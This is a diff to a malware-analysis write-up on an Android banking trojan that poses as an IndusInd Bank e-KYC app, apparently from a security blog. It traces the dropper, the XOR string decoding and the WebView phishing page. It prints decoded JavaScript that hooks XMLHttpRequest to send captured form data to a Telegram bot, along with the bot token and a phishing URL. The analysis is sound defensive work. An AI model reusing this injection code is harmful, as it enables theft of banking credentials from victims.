@@ -23,7 +23,9 @@ Salvador stealer is an android banking trojan that embeds phishing page inside t
 ### Initial Stager
 
 name: `INDUSLND_BANK_E_KYC.apk` 
+
 sha256: `21504d3f2f3c8d8d231575ca25b4e7e0871ad36ca6bbb825bf7f12bfc3b00f5a` 
+
 package name: `com.indusvalley.appinstall`
 
 The infection chain begins with the `INDUSLND_BANK_E_KYC.apk`, which impersonates a legitimate IndusInd Bank mobile banking application. However, the analysis reveals it to be a dropper that installs and executes the payload APK. 
@@ -39,15 +41,18 @@ The application requests the `REQUEST_INSTALL_PACKAGES` permission, which allows
 <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
 ```
 
-- Next, the `IndusKimkc` is the main and launcher activity that will be executed when victim launches the application.
+Next, the `IndusKimkc` is the main and launcher activity that will be executed when victim launches the application.
 
 ```xml
 <activity
     android:name="com.indusvalley.appinstall.IndusKimkc"
-    <intent-filter>
-        <action android:name="android.intent.action.MAIN"/>
+    android:exported="true"
+    android:launchMode="singleTop">
+	<intent-filter>
+		<action android:name="android.intent.action.MAIN"/>
         <category android:name="android.intent.category.LAUNCHER"/>
     </intent-filter>
+    ...
 </activity>
 ```
 
@@ -83,7 +88,9 @@ After committing the installation request, it registers a callback mechanism to 
 ### Payload
 
 name: `base.apk` 
+
 sha256: `7950cc61688a5bddbce3cb8e7cd6bec47eee9e38da3210098f5a5c20b39fb6d8` 
+
 package name: `com.deer.lion`
 
 <br>
@@ -162,3 +169,76 @@ Also, it incorporates Android's WorkManager components through AndroidX startup 
 #### Helene.java
 
 Lets now start the analysis following the execution flow beginning with the `Helene` activity that will transfer execution to its `onCreate()` method.
+
+![onCreate()](/images/2026-06-27-Salvador_Stealer/7.png)
+
+One of the first observations is the extensive use of obfuscated strings throughout the code, where every obfuscated string is wrapped inside calls to `NPStringFog.decode()`. Inspecting the `NPStringFog.decode()`, it revealed XOR routine that uses the key `npmanager` key to decode the plaintext strings. In the analysis below, I will be adding decoded string in the comments. 
+
+![NPStringFog.decode()](/images/2026-06-27-Salvador_Stealer/8.png)
+
+Returning to `onCreate()` method, it first calls `checkNetworkAndExitIfUnavailable()`. This method verifies if the device has an active internet connection. If no connection is found, it displays "***No Internet Connection. Exiting app.***" message and immediately terminates.
+
+![checkNetworkAndExitIfUnavailable()](/images/2026-06-27-Salvador_Stealer/9.png)
+
+It then calls `checkPermissions()` method to check if it has been granted following permissions:
+- `RECEIVE_SMS` 
+- `INTERNET` 
+- `SEND_SMS`
+
+![checkPermissions()](/images/2026-06-27-Salvador_Stealer/10.png)
+
+If any of these permissions are missing, it calls `requestAppPermissions()` method, which prompts victim to grant following permissions:
+
+![requestAppPermissions()](/images/2026-06-27-Salvador_Stealer/11.png)
+
+Once the permission checks are satisfied, it proceeds to initialize an embedded WebView through `setupWebView()` method.
+
+![setupWebView()](/images/2026-06-27-Salvador_Stealer/12.png)
+
+During initialization, it enables JavaScript execution and DOM storage:
+
+```java
+settings.setJavaScriptEnabled(true);
+settings.setDomStorageEnabled(true);
+```
+
+It then uses `webView.loadUrl()` to loads a remote phishing page hosted at `https://t15.muletipushpa.cloud/page/`, impersonating legitimate IndusInd Bank.
+
+![webView.loadUrl()](/images/2026-06-27-Salvador_Stealer/13.png)
+
+Additionally, after the remote phishing page finishes loading, it injects an obfuscated JavaScript payload through WebView's `onPageFinished()` callback. Decoding the obfuscated JavaScript payload using the same XOR routine ,we get:
+
+```js
+(function () {
+	const originalSend = XMLHttpRequest.prototype.send;
+	XMLHttpRequest.prototype.send = function (data) {
+		try {
+			const botToken = eval(decodeURIComponent('"7931012454:AAGdsBp3w5fSE9PxdrwNUopr3SU86mFQieE"'));
+			const chatId = eval(decodeURIComponent('"-1002480016657"'));
+			const telegramUrl = `https://api.telegram.org/bot${ botToken }/sendMessage`;
+			const telegramMessage = {
+				chat_id: chatId,
+				text: `Intercepted Data Sent:\n${ data }`
+			};
+			fetch(telegramUrl, {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify(telegramMessage)
+			});
+		} catch (e) {
+			console.error('Error sending to Telegram:', e);
+		}
+		return originalSend.apply(this, arguments);
+	};
+}());
+```
+
+The JavaScript hooks `XMLHttpRequest.prototype.send()`, so whenever the loaded phishing page submits data, it captures outgoing request body and forwards it to a Telegram bot.
+- Telegram Bot Token: `7931012454:AAGdsBp3w5fSE9PxdrwNUopr3SU86mFQieE`
+- Chat ID: `-1002480016657`
+
+Following this, it calls `initiateForegroundServiceIfRequired()` method that launches `Fitzgerald.class` as a foreground service. Before that, it checks for `RECEIVE_SMS` and `SEND_SMS` permissions by calling `hasNecessaryPermissions()`. If these permissions are missing, the victim is prompted again to grant permission by calling `requestAppPermissions()`.
+
+![initiateForegroundServiceIfRequired()](/images/2026-06-27-Salvador_Stealer/13.png)
+
+#### Fitzgerald.java
